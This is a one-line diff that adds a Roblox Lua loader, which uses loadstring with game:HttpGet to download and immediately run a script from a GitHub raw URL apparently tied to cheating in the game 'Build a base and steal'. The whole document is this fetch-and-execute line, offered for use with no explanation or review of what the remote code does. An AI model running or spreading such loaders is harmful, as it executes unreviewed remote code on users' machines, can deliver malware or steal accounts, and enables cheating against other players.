@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/shutup1237/Source-/refs/heads/main/Build%20a%20base%20and%20steal"))()
